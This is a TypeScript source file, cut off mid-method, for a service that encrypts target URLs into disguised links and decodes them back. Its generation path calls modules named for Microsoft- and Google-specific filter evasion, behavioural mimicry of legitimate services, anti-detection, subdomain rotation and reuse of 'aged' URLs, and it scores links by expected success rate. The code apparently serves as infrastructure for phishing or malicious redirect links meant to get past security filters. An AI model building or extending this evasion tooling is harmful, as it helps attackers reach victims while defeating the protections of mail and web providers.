import { xorDecrypt, xorEncrypt } from '../encryption/xorEncryption';
import { enhancedEncryption } from '../encryption/hybridEncryptionService';
import { secureEncryption } from '../encryption/secureEncryptionService';
import { StealthUrlDecoder } from '../encryption/stealthUrlDecoder';
import { supabase } from '@/integrations/supabase/client';
import { urlProcessingCache } from '../analytics/urlProcessingCache';
import { rateLimitingService } from './rateLimitingService';
import { optionalAnalytics } from '../optionalAnalytics';

// Enhanced interfaces for better type safety
export interface ProcessingResult {
  originalUrl: string;
  success: boolean;
  method: 'registry' | 'stealth' | 'pattern' | 'direct-xor' | 'aes' | 'intelligent' | 'direct_base34_decode' | 'all_methods_failed';
  error?: string;
  methodLogs?: string[];
}

export interface ProcessingError {
  code: string;
  message: string;
  method: string;
  recoverable: boolean;
  context?: any;
}

export interface ProcessingMetrics {
  totalProcessed: number;
  successfulProcessed: number;
  averageProcessingTime: number;
  methodPerformance: Map<string, number>;
  lastCleanup: number;
}

// Optimized core processor with consolidated methods
class OptimizedUrlProcessor {
  private stealthDecoder = new StealthUrlDecoder();
  private performanceMetrics: ProcessingMetrics = {
    totalProcessed: 0,
    successfulProcessed: 0,
    averageProcessingTime: 0,
    methodPerformance: new Map<string, number>(),
    lastCleanup: Date.now()
  };

  // Core processing pipeline - optimized with parallel processing and caching
  async processUrl(url: string, licenseKey: string): Promise<ProcessingResult> {
    const startTime = Date.now();
    const methodLogs: string[] = [];

    const log = (message: string) => {
      console.log(message);
      methodLogs.push(message);
    };

    log(`🚀 [OptimizedProcessor] Processing URL: ${url.substring(0, 50)}...`);

    // Check cache first for performance
    const cachedResult = urlProcessingCache.get(url);
    if (cachedResult) {
      log(`⚡ [OptimizedProcessor] Cache hit - returning cached result`);
      this.updateMetrics('cache', startTime, true);
      return {
        originalUrl: cachedResult,
        success: true,
        method: 'registry',
        methodLogs
      };
    }

    try {
      // Parallel processing for independent operations where possible
      const methods = [
        { name: 'registry', fn: () => this.tryRegistryLookup(url), priority: 1 },
        { name: 'direct', fn: () => this.tryDirectDecryption(url, licenseKey), priority: 2 },
        { name: 'pattern', fn: () => this.tryPatternDecryption(url, licenseKey), priority: 3 }
      ];

      // Try methods in order with timeout protection
      for (const method of methods) {
        try {
          log(`🔄 [OptimizedProcessor] Trying ${method.name} method`);

          const result = await this.executeWithTimeout(
            method.fn,
            5000 // 5 second timeout per method
          );

          if (result.success) {
            log(`✅ [OptimizedProcessor] ${method.name} method successful`);
            this.updateMetrics(method.name, startTime, true);

            // Cache successful results
            if (method.name === 'registry') {
              urlProcessingCache.set(url, result.originalUrl, 'registry');
            }

            return { ...result, methodLogs };
          } else {
            log(`❌ [OptimizedProcessor] ${method.name} method failed: ${result.error}`);
          }
        } catch (error) {
          log(`💥 [OptimizedProcessor] ${method.name} method error: ${error}`);
          continue;
        }
      }

      // If all methods failed
      this.updateMetrics('all_failed', startTime, false);
      return {
        originalUrl: '',
        success: false,
        method: 'all_methods_failed',
        error: 'All processing methods failed',
        methodLogs
      };

    } catch (error) {
      log(`💥 [OptimizedProcessor] Critical error: ${error}`);
      this.updateMetrics('error', startTime, false);
      return {
        originalUrl: '',
        success: false,
        method: 'all_methods_failed',
        error: `Critical processing error: ${error}`,
        methodLogs
      };
    }
  }

  // Execute function with timeout protection
  private async executeWithTimeout<T>(
    fn: () => Promise<T>,
    timeoutMs: number
  ): Promise<T> {
    return new Promise((resolve, reject) => {
      const timeout = setTimeout(() => {
        reject(new Error(`Operation timed out after ${timeoutMs}ms`));
      }, timeoutMs);

      fn()
        .then(result => {
          clearTimeout(timeout);
          resolve(result);
        })
        .catch(error => {
          clearTimeout(timeout);
          reject(error);
        });
    });
  }

  // Update performance metrics
  private updateMetrics(method: string, startTime: number, success: boolean): void {
    const duration = Date.now() - startTime;
    this.performanceMetrics.totalProcessed++;
    
    if (success) {
      this.performanceMetrics.successfulProcessed++;
    }

    // Update average processing time
    const currentAvg = this.performanceMetrics.averageProcessingTime;
    const total = this.performanceMetrics.totalProcessed;
    this.performanceMetrics.averageProcessingTime = 
      (currentAvg * (total - 1) + duration) / total;

    // Update method performance
    const methodCount = this.performanceMetrics.methodPerformance.get(method) || 0;
    this.performanceMetrics.methodPerformance.set(method, methodCount + 1);

    // Cleanup old metrics periodically
    if (Date.now() - this.performanceMetrics.lastCleanup > 3600000) { // 1 hour
      this.cleanupMetrics();
    }
  }

  private cleanupMetrics(): void {
    // Reset metrics if they get too large
    if (this.performanceMetrics.totalProcessed > 10000) {
      this.performanceMetrics.totalProcessed = Math.floor(this.performanceMetrics.totalProcessed / 2);
      this.performanceMetrics.successfulProcessed = Math.floor(this.performanceMetrics.successfulProcessed / 2);
      
      // Halve method performance counts
      for (const [method, count] of this.performanceMetrics.methodPerformance.entries()) {
        this.performanceMetrics.methodPerformance.set(method, Math.floor(count / 2));
      }
    }
    
    this.performanceMetrics.lastCleanup = Date.now();
  }

  // Consolidated registry lookup method
  private async tryRegistryLookup(url: string): Promise<ProcessingResult> {
    try {
      const hash = this.generateUrlHash(url);

      // Try RPC function first
      const { data, error } = await supabase.rpc('get_license_from_url', {
        url_hash_input: hash
      });

      if (!error && data && typeof data === 'object' && 'valid' in data && data.valid) {
        const result = data as { original_url: string; valid: boolean };
        return {
          originalUrl: result.original_url,
          success: true,
          method: 'registry'
        };
      }

      // Fallback to direct table lookup
      const { data: registryData, error: registryError } = await supabase
        .from('url_registry')
        .select('original_url, redirect_url')
        .eq('url_hash', hash)
        .eq('is_active', true)
        .maybeSingle();

      if (!registryError && registryData) {
        return {
          originalUrl: registryData.original_url || registryData.redirect_url,
          success: true,
          method: 'registry'
        };
      }

      return {
        originalUrl: '',
        success: false,
        method: 'registry',
        error: 'URL not found in registry'
      };

    } catch (error) {
      return {
        originalUrl: '',
        success: false,
        method: 'registry',
        error: `Registry lookup error: ${error}`
      };
    }
  }

  // Generate URL hash for registry lookup
  private generateUrlHash(url: string): string {
    // Simple hash function for URL identification
    let hash = 0;
    for (let i = 0; i < url.length; i++) {
      const char = url.charCodeAt(i);
      hash = ((hash << 5) - hash) + char;
      hash = hash & hash; // Convert to 32-bit integer
    }
    return Math.abs(hash).toString(36);
  }

  // Consolidated direct decryption method
  private async tryDirectDecryption(url: string, licenseKey: string): Promise<ProcessingResult> {
    // Extract encrypted parameter from various URL patterns
    const encryptedParam = this.extractEncryptedParam(url);
    if (!encryptedParam) {
      return {
        originalUrl: '',
        success: false,
        method: 'direct-xor',
        error: 'No encrypted parameter found'
      };
    }

    // Try XOR decryption first (fastest)
    try {
      const decryptedUrl = await xorDecrypt(encryptedParam, licenseKey);
      if (this.isValidUrl(decryptedUrl)) {
        return {
          originalUrl: decryptedUrl,
          success: true,
          method: 'direct-xor'
        };
      }
    } catch (error) {
      // Continue to AES
    }

    // Try AES decryption
    try {
      const decryptedUrl = await enhancedEncryption.decryptUrl(encryptedParam, licenseKey, 'aes');
      if (this.isValidUrl(decryptedUrl)) {
        return {
          originalUrl: decryptedUrl,
          success: true,
          method: 'aes'
        };
      }
    } catch (error) {
      // Try secure encryption fallback
      try {
        const secureResult = await secureEncryption.decrypt(encryptedParam, licenseKey);
        if (secureResult.success && this.isValidUrl(secureResult.plaintext)) {
          return {
            originalUrl: secureResult.plaintext,
            success: true,
            method: 'aes'
          };
        }
      } catch (secureError) {
        // Continue to next method
      }
    }

    return {
      originalUrl: '',
      success: false,
      method: 'direct-xor',
      error: 'All direct decryption methods failed'
    };
  }

  // Consolidated pattern-based decryption (stealth + pattern matching)
  private async tryPatternDecryption(url: string, licenseKey: string): Promise<ProcessingResult> {
    // Try stealth decoding first
    try {
      if (this.stealthDecoder.isStealthUrl(url)) {
        const decoded = await this.stealthDecoder.decodeStealthUrl(url, licenseKey);
        if (decoded.isValid && this.isValidUrl(decoded.originalUrl)) {
          return {
            originalUrl: decoded.originalUrl,
            success: true,
            method: 'stealth'
          };
        }
      }
    } catch (error) {
      // Continue to pattern matching
    }

    // Try intelligent pattern decoding
    const intelligentPatterns = [
      /\/dropbox\/shared\/documents\/[\w\-]+\?[\w=&]+/,
      /\/documents\/[\w\-]+\.(pdf|docx|pptx)\?[\w=&]+/,
      /\/api\/v\d+\/[\w\/]+\?[\w=&]+/,
      /\/services\/[\w\/]+\?[\w=&]+/,
      /\/portal\/[\w\/]+\?[\w=&]+/
    ];

    for (const pattern of intelligentPatterns) {
      const match = url.match(pattern);
      if (match) {
        const encryptedParam = this.extractEncryptedParam(url);
        if (encryptedParam) {
          try {
            const decryptedUrl = await enhancedEncryption.decryptUrl(encryptedParam, licenseKey, 'aes');
            if (this.isValidUrl(decryptedUrl)) {
              return {
                originalUrl: decryptedUrl,
                success: true,
                method: 'pattern'
              };
            }
          } catch (error) {
            // Continue to next pattern
          }
        }
      }
    }

    return {
      originalUrl: '',
      success: false,
      method: 'pattern',
      error: 'Pattern decryption failed'
    };
  }

  // Extract encrypted parameter from URL
  private extractEncryptedParam(url: string): string | null {
    const patterns = [
      /[?&]data=([^&]+)/,
      /[?&]d=([^&]+)/,
      /[?&]user=([^&]+)/,
      /[?&]session=([^&]+)/,
      /[?&]doc=([^&]+)/,
      /[?&]file=([^&]+)/,
      /\/e\/([^?&\/]+)/
    ];

    for (const pattern of patterns) {
      const match = url.match(pattern);
      if (match && match[1]) {
        return decodeURIComponent(match[1]);
      }
    }

    return null;
  }

  // URL validation
  private isValidUrl(url: string): boolean {
    try {
      new URL(url);
      return url.startsWith('http://') || url.startsWith('https://');
    } catch {
      return false;
    }
  }

  // Get performance metrics
  getMetrics(): ProcessingMetrics {
    return { ...this.performanceMetrics };
  }
}

// Main centralized URL processor class
class CentralizedUrlProcessor {
  private static instance: CentralizedUrlProcessor;
  private optimizedProcessor = new OptimizedUrlProcessor();

  private constructor() {}

  static getInstance(): CentralizedUrlProcessor {
    if (!CentralizedUrlProcessor.instance) {
      CentralizedUrlProcessor.instance = new CentralizedUrlProcessor();
    }
    return CentralizedUrlProcessor.instance;
  }

  // Main processing method - uses optimized processor internally
  async processUrl(urlToProcess: string, licenseKey: string = 'default-license'): Promise<ProcessingResult> {
    // Delegate to optimized processor
    return await this.optimizedProcessor.processUrl(urlToProcess, licenseKey);
  }

  // Essential helper methods for backward compatibility
  private isValidUrl(url: string): boolean {
    try {
      new URL(url);
      return url.startsWith('http://') || url.startsWith('https://');
    } catch {
      return false;
    }
  }

  private simpleHash(input: string): string {
    let hash = 0;
    for (let i = 0; i < input.length; i++) {
      const char = input.charCodeAt(i);
      hash = ((hash << 5) - hash) + char;
      hash = hash & hash;
    }
    return Math.abs(hash).toString(36);
  }

  private generateUrlHash(url: string, licenseKey?: string): string {
    const input = licenseKey ? `${url}:${licenseKey}` : url;
    return this.simpleHash(input);
  }

  // Legacy URL generation method (for /e/ format)
  async createLegacyRedirectUrl(targetUrl: string, licenseKeyId: string): Promise<string> {
    console.log('🔄 [CentralizedUrlProcessor] Creating legacy /e/ format URL');
    
    if (!this.isValidUrl(targetUrl)) {
      throw new Error('Invalid target URL format');
    }

    // Encrypt the URL using XOR with license key
    const encryptedUrl = await xorEncrypt(targetUrl, licenseKeyId);
    const generatedUrl = `/e/${encryptedUrl}`;

    // Register with retry logic
    await this.registerUrlWithRetry(generatedUrl, licenseKeyId, targetUrl);
    return generatedUrl;
  }

  // Enhanced URL registration with retry logic
  private async registerUrlWithRetry(
    generatedUrl: string,
    licenseKeyId: string,
    targetUrl: string,
    maxRetries = 5
  ): Promise<void> {
    let lastError: Error | null = null;

    for (let attempt = 0; attempt < maxRetries; attempt++) {
      try {
        const hash = this.generateUrlHash(generatedUrl, licenseKeyId);

        const { data, error } = await supabase.rpc('register_generated_url', {
          url_hash_input: hash,
          license_key_id_input: licenseKeyId,
          pattern_name_input: 'default',
          redirect_url_input: targetUrl,
          expiry_hours: 720 // 30 days
        });

        if (!error) {
          console.log(`✅ [CentralizedUrlProcessor] URL registered successfully on attempt ${attempt + 1}`);
          return;
        }

        lastError = new Error(error.message || 'Unknown registration error');
        console.warn(`⚠️ [CentralizedUrlProcessor] Registration attempt ${attempt + 1} failed:`, error);

        // Wait before retry (exponential backoff)
        if (attempt < maxRetries - 1) {
          const delay = Math.pow(2, attempt) * 1000; // 1s, 2s, 4s, 8s, 16s
          await new Promise(resolve => setTimeout(resolve, delay));
        }

      } catch (error) {
        lastError = error as Error;
        console.warn(`⚠️ [CentralizedUrlProcessor] Registration attempt ${attempt + 1} error:`, error);
        
        if (attempt < maxRetries - 1) {
          const delay = Math.pow(2, attempt) * 1000;
          await new Promise(resolve => setTimeout(resolve, delay));
        }
      }
    }

    // If all retries failed, log the error but don't fail the URL generation
    console.error('Database registration failed after all retries:', lastError?.message);
    // URL generation should still succeed even if registration fails
  }

  // ENHANCED UNIFIED URL GENERATION METHOD - With all new evasion techniques
  async generateUnifiedUrl(
    targetUrl: string,
    licenseKeyId: string,
    options: {
      pattern?: 'legacy' | 'document' | 'business' | 'content' | 'intelligent' | 'auto' | 'microsoft' | 'google' | 'mimicry';
      stealthLevel?: 'planA' | 'planB' | 'both';
      encryptionMode?: 'aes' | 'xor' | 'auto';
      patternData?: any;
      useAdvanced?: boolean;
      varietySeed?: number;
      forceNewHash?: boolean;
      enableAntiDetection?: boolean;
      targetProvider?: 'microsoft' | 'google' | 'corporate' | 'generic';
      useAgedUrl?: boolean;
      enableSubdomainRotation?: boolean;
    } = {}
  ): Promise<{ url: string; metadata: any }> {

    const {
      pattern = 'auto',
      stealthLevel = 'planA',
      encryptionMode = 'auto',
      patternData,
      useAdvanced = true,
      varietySeed = 0,
      forceNewHash = false,
      enableAntiDetection = true,
      targetProvider = 'generic',
      useAgedUrl = false,
      enableSubdomainRotation = true
    } = options;

    console.log('🚀 [CentralizedUrlProcessor] Enhanced generateUnifiedUrl called with options:', options);
    console.log('🎯 [CentralizedUrlProcessor] Target URL:', targetUrl);
    console.log('🔑 [CentralizedUrlProcessor] License ID:', licenseKeyId.substring(0, 8) + '...');

    // Input validation
    if (!targetUrl || typeof targetUrl !== 'string') {
      throw new Error('Target URL is required and must be a string');
    }

    if (!licenseKeyId || typeof licenseKeyId !== 'string') {
      throw new Error('License key ID is required and must be a string');
    }

    if (!this.isValidUrl(targetUrl)) {
      throw new Error('Invalid target URL format');
    }

    // Check rate limiting
    const rateLimitResult = await rateLimitingService.checkRateLimit(
      licenseKeyId,
      'url_generation',
      navigator.userAgent,
      'client-request'
    );

    if (!rateLimitResult.allowed) {
      throw new Error(`Rate limit exceeded: ${rateLimitResult.reason}. Try again in ${Math.ceil((rateLimitResult.resetTime.getTime() - Date.now()) / 60000)} minutes.`);
    }

    let finalUrl = '';
    let metadata = {};
    let usedFallback = false;

    try {
      // Strategy 0: Try to use aged URL if requested and available
      if (useAgedUrl) {
        try {
          const { urlAging } = await import('../evasion/urlAging');
          const agedUrl = await urlAging.getAgedUrl(targetUrl, licenseKeyId, pattern);
          if (agedUrl) {
            return {
              url: agedUrl.url,
              metadata: {
                pattern: agedUrl.pattern,
                tier: 1,
                contentType: 'application/pdf',
                expectedSuccessRate: agedUrl.reputationScore.toString(),
                encryptionMode: 'aged',
                generationMethod: 'aged-url',
                agedUrlId: agedUrl.id,
                usageCount: agedUrl.usageCount,
                reputationScore: agedUrl.reputationScore
              }
            };
          }
        } catch (error) {
          console.warn('Failed to get aged URL, continuing with fresh generation:', error);
        }
      }

      // Strategy 1: Use Microsoft-specific patterns
      if (pattern === 'microsoft' || targetProvider === 'microsoft') {
        try {
          const { microsoftEvasion } = await import('../evasion/microsoftEvasion');
          const msPattern = microsoftEvasion.getMicrosoftPattern(undefined, {
            useBusinessHours: true,
            mimicLegitimateServices: true
          });
          const msParams = microsoftEvasion.generateMicrosoftParameters(msPattern);

          // Replace encrypted placeholder
          msParams.encrypted = await this.generateEncryptedPayload(targetUrl, licenseKeyId, encryptionMode);

          finalUrl = this.replacePlaceholders(msPattern.template, msParams);
          metadata = {
            pattern: 'microsoft-evasion',
            tier: 1,
            contentType: msPattern.contentType,
            expectedSuccessRate: msPattern.successRate.toString(),
            encryptionMode: encryptionMode,
            generationMethod: 'microsoft-specific',
            microsoftCategory: msPattern.category
          };
        } catch (error) {
          console.warn('Microsoft pattern generation failed, falling back:', error);
        }
      }

      // Strategy 2: Use behavioral mimicry patterns
      else if (pattern === 'mimicry' || (pattern === 'auto' && Math.random() > 0.5)) {
        try {
          const { behavioralMimicry } = await import('../evasion/behavioralMimicry');
          const mimicryPattern = behavioralMimicry.selectOptimalPattern({
            preferHighTrust: true,
            avoidDetection: true,
            targetAudience: targetProvider === 'microsoft' ? 'business' : 'mixed'
          });
          const mimicryParams = behavioralMimicry.generateServiceParameters(mimicryPattern);

          // Replace encrypted placeholder
          mimicryParams.encrypted = await this.generateEncryptedPayload(targetUrl, licenseKeyId, encryptionMode);

          finalUrl = this.replacePlaceholders(mimicryPattern.template, mimicryParams);
          metadata = {
            pattern: 'behavioral-mimicry',
            tier: 1,
            contentType: mimicryPattern.headers['Content-Type'] || 'application/pdf',
            expectedSuccessRate: mimicryPattern.trustScore.toString(),
            encryptionMode: encryptionMode,
            generationMethod: 'behavioral-mimicry',
            serviceName: mimicryPattern.serviceName,
            recognitionRate: mimicryPattern.recognitionRate
          };
        } catch (error) {
          console.warn('Behavioral mimicry failed, falling back:', error);
        }
      }

      // Strategy 3: Use legacy format when specifically requested
      else if (!useAdvanced && pattern === 'legacy') {
        finalUrl = await this.createLegacyRedirectUrl(targetUrl, licenseKeyId);
        metadata = {
          pattern: 'legacy',
          tier: 0,
          contentType: 'text/html',
          expectedSuccessRate: '99',
          encryptionMode: 'xor',
          generationMethod: 'legacy'
        };
      }

      // Strategy 4: Use advanced pattern generation (DEFAULT)
      else if (!finalUrl) {
        console.log('🔮 [CentralizedUrlProcessor] Using advanced pattern generation with pattern:', pattern);

        try {
          // Enhanced encryption mode selection with variety
          let finalEncryptionMode = encryptionMode;
          if (encryptionMode === 'auto') {
            // Intelligent mode selection based on pattern and variety
            const varietyFactor = (options.varietySeed || 0) % 10;
            finalEncryptionMode = varietyFactor < 7 ? 'aes' : 'xor'; // 70% AES, 30% XOR for variety
          }

          console.log('🔐 [CentralizedUrlProcessor] Using encryption mode:', finalEncryptionMode, 'with variety factor:', (options.varietySeed || 0) % 10);

          // Generate the encrypted payload with enhanced encryption
          let encryptionResult;
          try {
            encryptionResult = await enhancedEncryption.encryptUrl(
              targetUrl,
              licenseKeyId,
              pattern,
              finalEncryptionMode
            );
            console.log('🔒 [CentralizedUrlProcessor] Encryption successful:', encryptionResult.mode);
          } catch (encryptionError) {
            console.warn('⚠️ [CentralizedUrlProcessor] Primary encryption failed, trying XOR:', encryptionError);
            // Fallback to XOR encryption
            const xorEncrypted = await xorEncrypt(targetUrl, licenseKeyId);
            encryptionResult = {
              encrypted: xorEncrypted,
              mode: 'xor'
            };
          }

          let encrypted = encryptionResult.encrypted;

          // Apply stealth obfuscation with enhanced error handling
          try {
            if (stealthLevel === 'planA' || stealthLevel === 'both') {
              encrypted = this.applyPlanAObfuscation(encrypted);
            }
            if (stealthLevel === 'planB' || stealthLevel === 'both') {
              encrypted = this.applyPlanBObfuscation(encrypted);
            }
            console.log('🛡️ [CentralizedUrlProcessor] Stealth obfuscation applied');
          } catch (obfuscationError) {
            console.warn('⚠️ [CentralizedUrlProcessor] Stealth obfuscation failed, using plain encrypted:', obfuscationError);
            // Continue with unobfuscated encrypted string
          }

          // Build URL based on pattern type
          try {
            finalUrl = this.buildPatternUrl(pattern, encrypted, patternData);
            console.log('🏗️ [CentralizedUrlProcessor] Pattern URL built successfully:', finalUrl);
          } catch (patternError) {
            console.error('❌ [CentralizedUrlProcessor] Pattern URL building failed:', patternError);
            // Use intelligent pattern instead of /e/ fallback
            finalUrl = `/services/portal/access?session=${Math.random().toString(36).substring(2, 6)}&data=${encrypted}`;
            console.log('🔄 [CentralizedUrlProcessor] Using intelligent fallback pattern:', finalUrl);
          }

          // Register in database with retry logic (optional - don't fail if this fails)
          try {
            await this.registerUrlWithRetry(finalUrl, licenseKeyId, targetUrl);
            console.log('📝 [CentralizedUrlProcessor] URL registered in database');
          } catch (registrationError) {
            console.warn('⚠️ [CentralizedUrlProcessor] Database registration failed, but URL still works:', registrationError);
            // Continue - URL will still work without database registration
          }

          // Track URL generation (optional analytics)
          await optionalAnalytics.trackUrlGeneration(true, pattern, 'advanced', {
            tier: patternData?.tier || 1,
            encryptionMode: encryptionResult.mode
          });

          metadata = {
            pattern: pattern,
            tier: patternData?.tier || 1,
            contentType: this.getContentTypeForPattern(pattern),
            expectedSuccessRate: patternData?.success_rate || this.getExpectedSuccessRate(pattern),
            encryptionMode: encryptionResult.mode,
            patternName: patternData?.name || this.getPatternName(pattern),
            generationMethod: 'advanced'
          };
          console.log('✅ [CentralizedUrlProcessor] Advanced URL generated successfully');

        } catch (advancedError) {
          console.error('❌ [CentralizedUrlProcessor] Advanced generation failed:', advancedError);
          throw advancedError; // Re-throw to trigger fallback
        }
      }

    } catch (primaryError) {
      console.error('❌ [CentralizedUrlProcessor] Primary generation failed:', primaryError);
      console.log('🔄 [CentralizedUrlProcessor] Attempting intelligent fallback...');

      // Intelligent Fallback Strategy
      try {
        usedFallback = true;
        console.log('🔄 [CentralizedUrlProcessor] Generating intelligent fallback URL...');

        // Use intelligent pattern with current timestamp
        const timestamp = Date.now().toString();
        const sessionId = timestamp.substring(0, 6);
        const encryptedFallback = await xorEncrypt(targetUrl, licenseKeyId);
        finalUrl = `/services/portal/access?session=${sessionId}&data=${encryptedFallback}`;

        // Try to register fallback URL
        try {
          await this.registerUrlWithRetry(finalUrl, licenseKeyId, targetUrl);
          console.log('📝 [CentralizedUrlProcessor] Intelligent fallback URL registered');
        } catch (fallbackRegError) {
          console.warn('⚠️ [CentralizedUrlProcessor] Fallback registration failed, but URL still works:', fallbackRegError);
        }

        metadata = {
          pattern: 'intelligent-fallback',
          tier: 1,
          contentType: 'application/json',
          expectedSuccessRate: '92',
          encryptionMode: 'xor',
          patternName: 'Intelligent Fallback Pattern',
          generationMethod: 'intelligent-fallback',
          originalError: primaryError.message
        };

        console.log('✅ [CentralizedUrlProcessor] Intelligent fallback URL generated successfully');

      } catch (fallbackError) {
        console.error('❌ [CentralizedUrlProcessor] Intelligent fallback also failed:', fallbackError);
        console.log('🆘 [CentralizedUrlProcessor] Using emergency /e/ fallback...');

        // Emergency fallback to legacy /e/ format
        try {
          const emergencyEncrypted = await xorEncrypt(targetUrl, licenseKeyId);
          finalUrl = `/e/${emergencyEncrypted}`;

          metadata = {
            pattern: 'emergency-legacy',
            tier: 0,
            contentType: 'text/html',
            expectedSuccessRate: '99',
            encryptionMode: 'xor',
            patternName: 'Emergency Legacy Pattern',
            originalError: primaryError.message,
            generationMethod: 'emergency-legacy'
          };

          console.log('🆘 [CentralizedUrlProcessor] Emergency /e/ fallback generated');

        } catch (emergencyError) {
          console.error('💥 [CentralizedUrlProcessor] All fallback methods failed:', emergencyError);
          throw new Error(`Complete URL generation failure. Primary: ${primaryError.message}. Fallback: ${fallbackError.message}. Emergency: ${emergencyError.message}`);
        }
      }
    }

    // Apply anti-detection measures if enabled
    if (enableAntiDetection && finalUrl) {
      try {
        finalUrl = await this.applyAntiDetectionMeasures(finalUrl, targetProvider);
      } catch (error) {
        console.warn('Anti-detection measures failed:', error);
      }
    }

    // Apply subdomain rotation if enabled
    if (enableSubdomainRotation && finalUrl) {
      try {
        const subdomainResult = await this.applySubdomainRotation(finalUrl);
        finalUrl = subdomainResult.url;
        metadata.subdomain = subdomainResult.subdomain;
        metadata.trustScore = subdomainResult.trustScore;
      } catch (error) {
        console.warn('Subdomain rotation failed:', error);
      }
    }

    // Final validation
    if (!finalUrl) {
      throw new Error('Generated URL is empty - this should never happen');
    }

    if (!finalUrl.startsWith('/') && !finalUrl.startsWith('http')) {
      throw new Error(`Generated URL has invalid format: ${finalUrl}`);
    }

    const result = {
      url: finalUrl,
      metadata: {
        ...metadata,
        generatedAt: new Date().toISOString(),
        usedFallback,
        targetUrlHash: this.simpleHash(targetUrl).substring(0, 16) // For debugging
      }
    };

    console.log('🎉 [CentralizedUrlProcessor] Final result:', result);
    return result;
  }

  // Enhanced helper methods for new functionality
  private async generateEncryptedPayload(targetUrl: string, licenseKeyId: string, encryptionMode: string): Promise<string> {
    try {
      if (encryptionMode === 'auto') {
        const varietyFactor = Math.random() * 10;
        encryptionMode = varietyFactor < 7 ? 'aes' : 'xor'; // 70% AES, 30% XOR
      }

      if (encryptionMode === 'aes') {
        const encryptionResult = await enhancedEncryption.encryptUrl(targetUrl, licenseKeyId, 'auto', 'aes');
        return encryptionResult.encrypted;
      } else {
        return await xorEncrypt(targetUrl, licenseKeyId);
      }
    } catch (error) {
      // Fallback to XOR
      return await xorEncrypt(targetUrl, licenseKeyId);
    }
  }

  private replacePlaceholders(template: string, params: Record<string, string>): string {
    let result = template;

    Object.entries(params).forEach(([key, value]) => {
      // CRITICAL FIX: Ensure value is never undefined/null
      const safeValue = value != null ? String(value) : this.generateFallbackValue(key);

      if (safeValue === 'undefined' || safeValue === 'null' || safeValue === '') {
        console.warn(`[replacePlaceholders] 🚨 CRITICAL: Invalid value for ${key}, generating fallback`);
        const fallbackValue = this.generateFallbackValue(key);
        console.log(`[replacePlaceholders] Generated fallback for ${key}: ${fallbackValue}`);

        const placeholder = `{${key}}`;
        result = result.replace(new RegExp(`\\${placeholder}`, 'g'), fallbackValue);
      } else {
        const placeholder = `{${key}}`;
        result = result.replace(new RegExp(`\\${placeholder}`, 'g'), safeValue);
      }
    });

    return result;
  }

  private generateFallbackValue(key: string): string {
    const keyLower = key.toLowerCase();

    // Common fallback mappings
    const fallbacks: Record<string, string> = {
      'session': 'sess' + Math.random().toString(36).substring(2, 8),
      'doc': 'doc' + Math.random().toString(36).substring(2, 6),
      'id': Math.random().toString(36).substring(2, 8),
      'ref': 'ref' + Math.random().toString(36).substring(2, 6),
      'token': 'tok' + Math.random().toString(36).substring(2, 8),
      'year': new Date().getFullYear().toString(),
      'month': (new Date().getMonth() + 1).toString().padStart(2, '0'),
      'day': new Date().getDate().toString().padStart(2, '0'),
      'version': '1.0',
      'type': 'standard',
      'format': 'pdf',
      'lang': 'en',
      'region': 'us'
    };

    if (fallbacks[keyLower]) {
      return fallbacks[keyLower];
    }

    // Generate based on key characteristics
    if (keyLower.includes('id') || keyLower.includes('num')) {
      return Math.random().toString(36).substring(2, 8);
    }

    if (keyLower.includes('date') || keyLower.includes('time')) {
      return new Date().toISOString().split('T')[0];
    }

    // Default fallback
    return Math.random().toString(36).substring(2, 6);
  }

  private async applyAntiDetectionMeasures(url: string, targetProvider: string): Promise<string> {
    try {
      const { antiDetection } = await import('../evasion/antiDetection');

      // Analyze current URL for detection risks
      const analysis = antiDetection.analyzeDetectionRisk(url);

      if (analysis.riskLevel === 'high' || analysis.riskLevel === 'critical') {
        // Apply anti-detection measures
        return antiDetection.applyAntiDetection(url, {
          aggressiveness: 'moderate',
          targetProvider: targetProvider as any,
          enableTimeBasedEvasion: true,
          enableBehavioralMimicry: true,
          enablePatternRotation: true
        });
      }

      return url;
    } catch (error) {
      console.warn('Anti-detection measures failed:', error);
      return url;
    }
  }

  private async applySubdomainRotation(url: string): Promise<{ url: string; subdomain: string; trustScore: number }> {
    try {
      const { subdomainRotation } = await import('../evasion/subdomainRotation');

      return subdomainRotation.buildSubdomainUrl('example.com', url, {
        preferHighTrust: true,
        balanceUsage: true,
        avoidRecent: true
      });
    } catch (error) {
      console.warn('Subdomain rotation failed:', error);
      return {
        url,
        subdomain: 'www',
        trustScore: 50
      };
    }
  }

  // Enhanced URL validation with comprehensive checks
  async validateGeneratedUrl(url: string): Promise<{
    isValid: boolean;
    issues: string[];
    recommendations: string[];
    riskScore: number;
  }> {
    const issues: string[] = [];
    const recommendations: string[] = [];
    let riskScore = 0;

    // Basic URL validation
    if (!url || url.length === 0) {
      issues.push('URL is empty');
      riskScore += 100;
    }

    if (!url.startsWith('/') && !url.startsWith('http')) {
      issues.push('URL must start with / or http');
      riskScore += 50;
    }

    // Check for detection patterns
    try {
      const { antiDetection } = await import('../evasion/antiDetection');
      const analysis = antiDetection.analyzeDetectionRisk(url);

      if (analysis.detectedPatterns.length > 0) {
        issues.push(`Detected ${analysis.detectedPatterns.length} suspicious patterns`);
        riskScore += analysis.detectedPatterns.length * 10;
        recommendations.push(...analysis.recommendations);
      }
    } catch (error) {
      console.warn('Detection analysis failed:', error);
    }

    // Check for placeholder issues
    const unreplacedPlaceholders = url.match(/\{[^}]+\}/g);
    if (unreplacedPlaceholders) {
      issues.push(`Unreplaced placeholders: ${unreplacedPlaceholders.join(', ')}`);
      riskScore += unreplacedPlaceholders.length * 20;
      recommendations.push('Ensure all placeholders are properly replaced with actual values');
    }

    // Check URL length
    if (url.length > 2000) {
      issues.push('URL is too long (>2000 characters)');
      riskScore += 30;
      recommendations.push('Shorten URL to improve compatibility');
    }

    return {
      isValid: issues.length === 0,
      issues,
      recommendations,
      riskScore: Math.min(100, riskScore)
    };
  }

  // Performance monitoring for new features
  async getPerformanceMetrics(): Promise<{
    totalGenerated: number;
    successRate: number;
    averageGenerationTime: number;
    patternDistribution: Record<string, number>;
    antiDetectionEffectiveness: number;
  }> {
    const metrics = this.optimizedProcessor.getMetrics();

    return {
      totalGenerated: metrics.totalProcessed,
      successRate: metrics.totalProcessed > 0
        ? (metrics.successfulProcessed / metrics.totalProcessed) * 100
        : 0,
      averageGenerationTime: metrics.averageProcessingTime,
      patternDistribution: Object.fromEntries(metrics.methodPerformance),
      antiDetectionEffectiveness: 85 // This would be calculated from actual usage data
    };
  }

  // Helper methods for unified URL generation
  private applyPlanAObfuscation(encrypted: string): string {
    // Add time-based salt prefix
